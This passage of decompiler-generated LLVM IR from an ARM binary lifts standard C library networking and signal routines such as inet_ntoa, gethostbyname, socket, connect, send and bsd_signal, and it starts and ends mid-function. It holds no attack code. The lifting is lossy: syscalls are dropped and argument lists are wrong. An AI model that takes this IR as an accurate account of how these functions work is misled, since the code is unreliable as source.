  store i8 %v1_16038, i8* %v4_16038, align 1
  %v0_1603c = load i32, i32* @r4, align 4
  %v1_1603c = add i32 %v0_1603c, 17
  store i32 %v1_1603c, i32* %r0.global-to-local, align 4
  %v4_16040 = call i32 @__GI_mempcpy(i32 %v1_1603c, i32 %v2_1602c, i32 19, i32 %v3_1601c)
  store i32 %v4_16040, i32* %r0.global-to-local, align 4
  %v0_16044 = load i32, i32* @r5, align 4
  store i32 %v0_16044, i32* %r1.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_1604c = inttoptr i32 %v4_16040 to i8*
  %v3_1604c = call i32 @__GI_memset(i8* %v2_1604c, i32 %v0_16044)
  store i32 %v3_1604c, i32* %r0.global-to-local, align 4
  %v0_16050.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_16050

dec_label_pc_16050:                               ; preds = %entry, %dec_label_pc_1600c
  %v0_16050 = phi i32 [ %v3_16000, %entry ], [ %v0_16050.pre, %dec_label_pc_1600c ]
  store i32 %v0_16050, i32* %r0.global-to-local, align 4
  store i32 %v3_15fe8, i32* @r4, align 4
  store i32 %v6_15fe8, i32* @r5, align 4
  ret i32 %v0_16050

; uselistorder directives
  uselistorder i32 %v0_16050, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 4, 2, 3, 5 }
  uselistorder label %dec_label_pc_16050, { 1, 0 }
}

define i32 @__GI_htons(i32 %arg1) local_unnamed_addr {
entry:
  %v3_16064 = udiv i32 %arg1, 256
  %v1_16068 = mul i32 %arg1, 256
  %v4_1606c = and i32 %v1_16068, 65280
  %v5_1606c = or i32 %v4_1606c, %v3_16064
  ret i32 %v5_1606c
}

define i32 @__GI_htonl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_1608c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_1608c
}

define i32 @__GI_ntohs(i32 %arg1) local_unnamed_addr {
entry:
  %v3_16094 = udiv i32 %arg1, 256
  %v1_16098 = mul i32 %arg1, 256
  %v4_1609c = and i32 %v1_16098, 65280
  %v5_1609c = or i32 %v4_1609c, %v3_16094
  ret i32 %v5_1609c
}

define i32 @__GI_ntohl(i32 %arg1) local_unnamed_addr {
entry:
  %v5_160bc = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v5_160bc
}

define i32 @hstrerror(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %arg1, 5
  br i1 %tmp, label %dec_label_pc_160e4, label %dec_label_pc_160d8

dec_label_pc_160d8:                               ; preds = %entry
  ret i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -34024)

dec_label_pc_160e4:                               ; preds = %entry
  %v4_160ec = mul i32 %arg1, 4
  %v5_160ec = add i32 %v4_160ec, add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -20)
  %v6_160ec = inttoptr i32 %v5_160ec to i32*
  %v7_160ec = load i32, i32* %v6_160ec, align 4
  ret i32 %v7_160ec

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_herror(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r5, align 4
  %v3_16108 = icmp eq i8* %arg1, null
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r4, align 4
  br i1 %v3_16108, label %dec_label_pc_1612c, label %dec_label_pc_16118

dec_label_pc_16118:                               ; preds = %entry
  %v2_16118 = load i8, i8* %arg1, align 1
  %v2_1611c = icmp eq i8 %v2_16118, 0
  br i1 %v2_1611c, label %dec_label_pc_1612c, label %dec_label_pc_16138

dec_label_pc_1612c:                               ; preds = %dec_label_pc_16118, %entry
  br label %dec_label_pc_16138

dec_label_pc_16138:                               ; preds = %dec_label_pc_16118, %dec_label_pc_1612c
  %storemerge = phi i32 [ add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -34006), %dec_label_pc_1612c ], [ add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 -34008), %dec_label_pc_16118 ]
  store i32 %storemerge, i32* @r6, align 4
  %v0_16138 = call i32 @__GI___h_errno_location()
  %v1_1613c = inttoptr i32 %v0_16138 to i32*
  %v2_1613c = load i32, i32* %v1_1613c, align 4
  %v2_16140 = icmp ugt i32 %v2_1613c, 3
  %v7_16140 = icmp eq i32 %v2_1613c, 4
  %v2_16144 = xor i1 %v7_16140, true
  %v3_16144 = and i1 %v2_16140, %v2_16144
  br i1 %v3_16144, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_16138
  %v4_16148 = load i32, i32* @r4, align 4
  %v6_16148 = add i32 %v4_16148, -34024
  store i32 %v6_16148, i32* @ip, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16138, %bb
  %v2_1614c = xor i1 %v2_16140, true
  %v3_1614c = or i1 %v7_16140, %v2_1614c
  br i1 %v3_1614c, label %bb16, label %._crit_edge

._crit_edge:                                      ; preds = %.thread4
  %v0_16174.pre = load i32, i32* @ip, align 4
  %v0_16160.pre = load i32, i32* @r4, align 4
  br label %bb17

bb16:                                             ; preds = %.thread4
  %v4_16150 = load i32, i32* @r4, align 4
  %v6_16150 = add i32 %v4_16150, -20
  %v8_16154 = mul i32 %v2_1613c, 4
  %v9_16154 = add i32 %v6_16150, %v8_16154
  %v10_16154 = inttoptr i32 %v9_16154 to i32*
  %v11_16154 = load i32, i32* %v10_16154, align 4
  store i32 %v11_16154, i32* @ip, align 4
  br label %bb17

bb17:                                             ; preds = %._crit_edge, %bb16
  %v0_16160 = phi i32 [ %v0_16160.pre, %._crit_edge ], [ %v4_16150, %bb16 ]
  %v0_16174 = phi i32 [ %v0_16174.pre, %._crit_edge ], [ %v11_16154, %bb16 ]
  %v2_16160 = add i32 %v0_16160, 96
  %v3_16160 = inttoptr i32 %v2_16160 to i32*
  %v4_16160 = load i32, i32* %v3_16160, align 4
  %v2_16164 = add i32 %v0_16160, -34140
  %v1_16168 = inttoptr i32 %v4_16160 to i32*
  %v2_16168 = load i32, i32* %v1_16168, align 4
  store i32 %v2_16168, i32* @r0, align 4
  %v0_1616c = load i32, i32* @r5, align 4
  %v0_16170 = load i32, i32* @r6, align 4
  %v6_16178 = call i32 @fprintf(i32 %v2_16168, i32 %v2_16164, i32 %v0_1616c, i32 %v0_16170, i32 %v0_16174)
  ret i32 %v6_16178

; uselistorder directives
  uselistorder i32 %v0_16160, { 1, 0 }
  uselistorder i1 %v7_16140, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_16138, { 1, 0 }
}

define i32 @__GI_inet_ntoa_r() local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %v3_161a0 = load i32, i32* @r4, align 4
  %v6_161a0 = load i32, i32* @r5, align 4
  %v9_161a0 = load i32, i32* @r6, align 4
  %v12_161a0 = load i32, i32* @r7, align 4
  %v15_161a0 = load i32, i32* @r8, align 4
  %v18_161a0 = load i32, i32* @sb, align 4
  %v21_161a0 = load i32, i32* @sl, align 4
  %v24_161a0 = load i32, i32* @fp, align 4
  %v0_161a4 = load i32, i32* @r0, align 4
  %v5_161c0 = call i32 @llvm.bswap.i32(i32 %v0_161a4)
  %v0_161c4 = load i32, i32* @r1, align 4
  %v1_161c4 = add i32 %v0_161c4, 15
  store i32 %v1_161c4, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 255, i32* @r7, align 4
  store i32 46, i32* @sl, align 4
  br label %dec_label_pc_16200

dec_label_pc_161e4:                               ; preds = %dec_label_pc_16200
  %v1_161ec = inttoptr i32 %v0_1621c to i8*
  %v2_161ec = call i32 @_uintmaxtostr(i8* %v1_161ec)
  %v0_161f0 = load i32, i32* @r6, align 4
  %v2_161f0 = icmp eq i32 %v0_161f0, 0
  %v1_161f4 = add i32 %v2_161ec, -1
  store i32 %v1_161f4, i32* %r1.global-to-local, align 4
  br i1 %v2_161f0, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_161e4
  %v1_161f8 = load i32, i32* @sl, align 4
  %v2_161f8 = trunc i32 %v1_161f8 to i8
  %v4_161f8 = inttoptr i32 %v0_161f0 to i8*
  store i8 %v2_161f8, i8* %v4_161f8, align 1
  %v0_161fc.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_161e4, %bb
  %v0_161fc = phi i32 [ %v1_161f4, %dec_label_pc_161e4 ], [ %v0_161fc.pre, %bb ]
  store i32 %v0_161fc, i32* @r6, align 4
  %v0_16200.pre = load i32, i32* @r5, align 4
  %v0_16204.pre = load i32, i32* @r7, align 4
  %v1_16204.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16200

dec_label_pc_16200:                               ; preds = %entry, %bb17
  %v0_1621c = phi i32 [ %v1_161c4, %entry ], [ %v0_161fc, %bb17 ]
  %v1_16204 = phi i32 [ %v5_161c0, %entry ], [ %v1_16204.pre, %bb17 ]
  %v0_16204 = phi i32 [ 255, %entry ], [ %v0_16204.pre, %bb17 ]
  %v0_16214 = phi i32 [ 0, %entry ], [ %v0_16200.pre, %bb17 ]
  %v7_16200 = icmp eq i32 %v0_16214, 3
  store i1 %v7_16200, i1* @cpsr_z, align 1
  %v2_16204 = and i32 %v0_16204, %v1_16204
  store i32 %v2_16204, i32* @r2, align 4
  store i32 0, i32* @r3, align 4
  %v3_16210 = udiv i32 %v1_16204, 256
  store i32 %v3_16210, i32* @r4, align 4
  %v1_16214 = add i32 %v0_16214, 1
  store i32 %v1_16214, i32* @r5, align 4
  %v7_16218 = icmp sgt i32 %v0_16214, 3
  br i1 %v7_16218, label %dec_label_pc_1621c, label %dec_label_pc_161e4

dec_label_pc_1621c:                               ; preds = %dec_label_pc_16200
  %v1_1621c = add i32 %v0_1621c, 1
  store i32 %v3_161a0, i32* @r4, align 4
  store i32 %v6_161a0, i32* @r5, align 4
  store i32 %v9_161a0, i32* @r6, align 4
  store i32 %v12_161a0, i32* @r7, align 4
  store i32 %v15_161a0, i32* @r8, align 4
  store i32 %v18_161a0, i32* @sb, align 4
  store i32 %v21_161a0, i32* @sl, align 4
  store i32 %v24_161a0, i32* @fp, align 4
  ret i32 %v1_1621c

; uselistorder directives
  uselistorder i32 %v0_16214, { 2, 0, 1 }
  uselistorder i32 %v0_161fc, { 1, 0 }
  uselistorder i32 (i8*)* @_uintmaxtostr, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16200, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__GI_inet_ntoa(i32 %arg1) local_unnamed_addr {
entry:
  store i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 25800), i32* @r1, align 4
  %v0_1623c = call i32 @__GI_inet_ntoa_r()
  %v0_16240 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_16240, label %bb, label %.thread

bb:                                               ; preds = %entry
  store i32 0, i32* @r5, align 4
  %v2_16244 = load i32, i32* @r8, align 4
  %v5_16244 = sdiv i32 %v2_16244, 512
  %v6_16244 = and i32 %v5_16244, %v0_1623c
  store i32 %v6_16244, i32* @r6, align 4
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  ret i32 %v0_1623c

; uselistorder directives
  uselistorder i32 %v0_1623c, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @inet_addr(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v2_16250 = ptrtoint i32* %stack_var_-12 to i32
  %v0_16254 = load i32, i32* @r0, align 4
  %v2_16254 = inttoptr i32 %v0_16254 to i8*
  %v3_16254 = call i32 @inet_aton(i8* %v2_16254, i32 %v2_16250)
  %v2_16258 = icmp eq i32 %v3_16254, 0
  %v4_1625c = load i32, i32* %stack_var_-12, align 4
  %storemerge = select i1 %v2_16258, i32 -1, i32 %v4_1625c
  ret i32 %storemerge
}

define i32 @__GI_gethostbyname(i32 %arg1) local_unnamed_addr {
entry:
  store i32 2, i32* @r1, align 4
  %v0_1627c = call i32 @__GI_gethostbyname2()
  ret i32 %v0_1627c
}

define i32 @__GI_gethostbyname2() local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_1628c = load i32, i32* @r4, align 4
  %v6_1628c = load i32, i32* @r5, align 4
  %v0_16294 = load i32, i32* @r0, align 4
  store i32 %v0_16294, i32* @r4, align 4
  %v0_16298 = load i32, i32* @r1, align 4
  store i32 %v0_16298, i32* @r5, align 4
  %v0_1629c = call i32 @__GI___h_errno_location()
  %v0_162c4 = load i32, i32* @r4, align 4
  %v2_162c8 = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_162c8, i32* @ip, align 4
  %v0_162cc = load i32, i32* @r5, align 4
  %v8_162d4 = call i32 @gethostbyname2_r(i32 %v0_162c4, i32 %v0_162cc, i32* inttoptr (i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 26256) to i32*), i32 add (i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32 25816), i32 440, i32 %v2_162c8, i32 %v0_1629c)
  %v3_162d8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_1628c, i32* @r4, align 4
  store i32 %v6_1628c, i32* @r5, align 4
  ret i32 %v3_162d8
}

define i32 @function_162ec(i64* %arg1) local_unnamed_addr {
dec_label_pc_162ec:
  %tmp = ptrtoint i64* %arg1 to i32
  %v0_162ec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_162ec, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_162ec
  %v3_162ec = load i64, i64* %arg1, align 4
  %v4_162ec = load i32, i32* @r8, align 4
  %v6_162ec = udiv i64 %v3_162ec, 4294967296
  %v7_162ec = trunc i64 %v6_162ec to i32
  %v9_162ec = sub i32 %tmp, %v4_162ec
  %v3_162f0 = mul i32 %v7_162ec, %v9_162ec
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_162ec, %bb
  %v4_162f0 = phi i32 [ %tmp, %dec_label_pc_162ec ], [ %v3_162f0, %bb ]
  ret i32 %v4_162f0

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__libc_connect(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_162f4 = load i32, i32* @r7, align 4
  store i32 %v3_162f4, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1631c, label %dec_label_pc_1630c

dec_label_pc_1630c:                               ; preds = %entry
  %v0_1630c = call i32 @__GI___errno_location()
  %v0_16310 = load i32, i32* %r7.global-to-local, align 4
  %v1_16310 = sub i32 0, %v0_16310
  %v2_16314 = inttoptr i32 %v0_1630c to i32*
  store i32 %v1_16310, i32* %v2_16314, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_16320.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1631c

dec_label_pc_1631c:                               ; preds = %entry, %dec_label_pc_1630c
  %v2_16320 = phi i32 [ %v3_162f4, %entry ], [ %v2_16320.pre, %dec_label_pc_1630c ]
  %v0_1631c = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1630c ]
  store i32 %v2_16320, i32* @r7, align 4
  ret i32 %v0_1631c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1631c, { 1, 0 }
}

define i32 @__GI_getsockname(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1632c = load i32, i32* @r7, align 4
  store i32 %v3_1632c, i32* %stack_var_-8, align 4
  %v0_16338 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_16338, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_16338, -4095
  br i1 %tmp, label %dec_label_pc_16358, label %dec_label_pc_16348

dec_label_pc_16348:                               ; preds = %entry
  %v0_16348 = call i32 @__GI___errno_location()
  %v0_1634c = load i32, i32* %r7.global-to-local, align 4
  %v1_1634c = sub i32 0, %v0_1634c
  %v2_16350 = inttoptr i32 %v0_16348 to i32*
  store i32 %v1_1634c, i32* %v2_16350, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_16358.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16358

dec_label_pc_16358:                               ; preds = %entry, %dec_label_pc_16348
  %v1_1635c = phi i32 [ %v0_16338, %entry ], [ -1, %dec_label_pc_16348 ]
  %v2_16358 = phi i32 [ %v3_1632c, %entry ], [ %v2_16358.pre, %dec_label_pc_16348 ]
  store i32 %v2_16358, i32* @r7, align 4
  ret i32 %v1_1635c

; uselistorder directives
  uselistorder i32 %v0_16338, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16358, { 1, 0 }
}

define i32 @getsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16398, label %dec_label_pc_16388

dec_label_pc_16388:                               ; preds = %entry
  %v0_16388 = call i32 @__GI___errno_location()
  %v0_1638c = load i32, i32* %r4.global-to-local, align 4
  %v1_1638c = sub i32 0, %v0_1638c
  %v2_16390 = inttoptr i32 %v0_16388 to i32*
  store i32 %v1_1638c, i32* %v2_16390, align 4
  br label %dec_label_pc_16398

dec_label_pc_16398:                               ; preds = %entry, %dec_label_pc_16388
  %v1_163a0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16388 ]
  ret i32 %v1_163a0

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_16398, { 1, 0 }
}

define i32 @__libc_recv(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163a8 = load i32, i32* @r7, align 4
  store i32 %v3_163a8, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_163d0, label %dec_label_pc_163c0

dec_label_pc_163c0:                               ; preds = %entry
  %v0_163c0 = call i32 @__GI___errno_location()
  %v0_163c4 = load i32, i32* %r7.global-to-local, align 4
  %v1_163c4 = sub i32 0, %v0_163c4
  %v2_163c8 = inttoptr i32 %v0_163c0 to i32*
  store i32 %v1_163c4, i32* %v2_163c8, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_163d4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_163d0

dec_label_pc_163d0:                               ; preds = %entry, %dec_label_pc_163c0
  %v2_163d4 = phi i32 [ %v3_163a8, %entry ], [ %v2_163d4.pre, %dec_label_pc_163c0 ]
  %v0_163d0 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_163c0 ]
  store i32 %v2_163d4, i32* @r7, align 4
  ret i32 %v0_163d0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_163d0, { 1, 0 }
}

define i32 @__libc_send(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_163e0 = load i32, i32* @r7, align 4
  store i32 %v3_163e0, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16408, label %dec_label_pc_163f8

dec_label_pc_163f8:                               ; preds = %entry
  %v0_163f8 = call i32 @__GI___errno_location()
  %v0_163fc = load i32, i32* %r7.global-to-local, align 4
  %v1_163fc = sub i32 0, %v0_163fc
  %v2_16400 = inttoptr i32 %v0_163f8 to i32*
  store i32 %v1_163fc, i32* %v2_16400, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1640c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_16408

dec_label_pc_16408:                               ; preds = %entry, %dec_label_pc_163f8
  %v2_1640c = phi i32 [ %v3_163e0, %entry ], [ %v2_1640c.pre, %dec_label_pc_163f8 ]
  %v0_16408 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_163f8 ]
  store i32 %v2_1640c, i32* @r7, align 4
  ret i32 %v0_16408

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16408, { 1, 0 }
}

define i32 @__libc_sendto(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16418 = load i32, i32* @r4, align 4
  store i32 %v3_16418, i32* %stack_var_-16, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_16448, label %dec_label_pc_16438

dec_label_pc_16438:                               ; preds = %entry
  %v0_16438 = call i32 @__GI___errno_location()
  %v0_1643c = load i32, i32* %r4.global-to-local, align 4
  %v1_1643c = sub i32 0, %v0_1643c
  %v2_16440 = inttoptr i32 %v0_16438 to i32*
  store i32 %v1_1643c, i32* %v2_16440, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_1644c.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_16448

dec_label_pc_16448:                               ; preds = %entry, %dec_label_pc_16438
  %v2_1644c = phi i32 [ %v3_16418, %entry ], [ %v2_1644c.pre, %dec_label_pc_16438 ]
  %v0_16448 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_16438 ]
  store i32 %v2_1644c, i32* @r4, align 4
  ret i32 %v0_16448

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16448, { 1, 0 }
}

define i32 @__GI_setsockopt(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1648c, label %dec_label_pc_1647c

dec_label_pc_1647c:                               ; preds = %entry
  %v0_1647c = call i32 @__GI___errno_location()
  %v0_16480 = load i32, i32* %r4.global-to-local, align 4
  %v1_16480 = sub i32 0, %v0_16480
  %v2_16484 = inttoptr i32 %v0_1647c to i32*
  store i32 %v1_16480, i32* %v2_16484, align 4
  br label %dec_label_pc_1648c

dec_label_pc_1648c:                               ; preds = %entry, %dec_label_pc_1647c
  %v1_16494 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1647c ]
  ret i32 %v1_16494

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1648c, { 1, 0 }
}

define i32 @socket(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1649c = load i32, i32* @r7, align 4
  store i32 %v3_1649c, i32* %stack_var_-8, align 4
  %v0_164a8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_164a8, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %v0_164a8, -4095
  br i1 %tmp, label %dec_label_pc_164c8, label %dec_label_pc_164b8

dec_label_pc_164b8:                               ; preds = %entry
  %v0_164b8 = call i32 @__GI___errno_location()
  %v0_164bc = load i32, i32* %r7.global-to-local, align 4
  %v1_164bc = sub i32 0, %v0_164bc
  %v2_164c0 = inttoptr i32 %v0_164b8 to i32*
  store i32 %v1_164bc, i32* %v2_164c0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_164c8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_164c8

dec_label_pc_164c8:                               ; preds = %entry, %dec_label_pc_164b8
  %v1_164cc = phi i32 [ %v0_164a8, %entry ], [ -1, %dec_label_pc_164b8 ]
  %v2_164c8 = phi i32 [ %v3_1649c, %entry ], [ %v2_164c8.pre, %dec_label_pc_164b8 ]
  store i32 %v2_164c8, i32* @r7, align 4
  ret i32 %v1_164cc

; uselistorder directives
  uselistorder i32 %v0_164a8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_164c8, { 1, 0 }
}

define i32 @__GI_raise(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v3_164d4 = load i32, i32* @r4, align 4
  %v0_164dc = call i32 @__GI_getpid()
  %v2_164e4 = call i32 @kill(i32 %v0_164dc, i32 %arg1)
  store i32 %v3_164d4, i32* @r4, align 4
  ret i32 %v2_164e4

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 0, 2, 1 }
  uselistorder i32 ()* @__GI_getpid, { 0, 3, 2, 1 }
}

define i32 @__GI_sigaddset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r1, align 4
  %tmp4 = icmp slt i32 %arg1, 1
  br i1 %tmp4, label %dec_label_pc_16508, label %dec_label_pc_16500

dec_label_pc_16500:                               ; preds = %entry
  %v7_16504 = icmp slt i32 %arg1, 65
  br i1 %v7_16504, label %dec_label_pc_1651c, label %dec_label_pc_16508

dec_label_pc_16508:                               ; preds = %dec_label_pc_16500, %entry
  %v0_16508 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16514 = inttoptr i32 %v0_16508 to i32*
  store i32 22, i32* %v2_16514, align 4
  %v0_16524.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16524

dec_label_pc_1651c:                               ; preds = %dec_label_pc_16500
  %v0_1651c = call i32 @__sigaddset()
  store i32 %v0_1651c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_16524

dec_label_pc_16524:                               ; preds = %dec_label_pc_16508, %dec_label_pc_1651c
  %v0_16524 = phi i32 [ %v0_16524.pre, %dec_label_pc_16508 ], [ %v0_1651c, %dec_label_pc_1651c ]
  ret i32 %v0_16524

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_16524, { 1, 0 }
}

define i32 @sigemptyset(i32* %arg1) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v2_1653c = add i32 %tmp, 4
  %v3_1653c = inttoptr i32 %v2_1653c to i32*
  store i32 0, i32* %v3_1653c, align 4
  %v1_16540 = load i32, i32* %r3.global-to-local, align 4
  %v2_16540 = inttoptr i32 %v1_16540 to i32*
  store i32 0, i32* %v2_16540, align 4
  ret i32 0
}

define i32 @bsd_signal(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_16548 = load i32, i32* @r4, align 4
  store i32 %v3_16548, i32* %stack_var_-16, align 4
  %v6_16548 = load i32, i32* @r5, align 4
  %v9_16548 = load i32, i32* @r6, align 4
  %v7_16550 = icmp eq i32 %arg2, -1
  br i1 %v7_16550, label %.thread4, label %bb

.thread4:                                         ; preds = %entry
  br label %.thread16

bb:                                               ; preds = %entry
  %v2_16558 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %arg1, i32* @r5, align 4
  %tmp28 = icmp slt i32 %arg1, 1
  br i1 %tmp28, label %.thread16, label %dec_label_pc_16574

.thread16:                                        ; preds = %bb, %.thread4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1657c

dec_label_pc_16574:                               ; preds = %bb
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i16* @global_var_2c158.876 to i32), i32* @r6, align 4
  %v7_16578 = icmp slt i32 %arg1, 65
  br i1 %v7_16578, label %dec_label_pc_16590, label %dec_label_pc_1657c

dec_label_pc_1657c:                               ; preds = %.thread16, %dec_label_pc_16574
  %v0_1657c = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_16588 = inttoptr i32 %v0_1657c to i32*
  store i32 22, i32* %v2_16588, align 4
  %v0_165e8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb33

dec_label_pc_16590:                               ; preds = %dec_label_pc_16574
  %v2_16590 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_16590, i32* @r4, align 4
  store i32 %arg1, i32* @r1, align 4
  %v2_16598 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_16598, i32* @r0, align 4
  store i32 %arg2, i32* %stack_var_-36, align 4
  store i32 0, i32* %stack_var_-24, align 4
